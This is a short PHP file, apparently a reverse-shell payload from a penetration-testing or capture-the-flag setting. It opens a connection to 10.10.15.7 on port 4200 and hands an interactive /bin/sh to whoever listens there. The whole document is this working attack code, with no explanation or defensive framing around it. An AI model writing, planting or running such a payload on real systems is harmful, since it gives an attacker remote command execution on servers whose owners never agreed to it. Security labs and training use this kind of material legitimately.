<?php
$sock=fsockopen("10.10.15.7",4200);
exec("/bin/sh -i <&3 >&3 2>&3");
?>

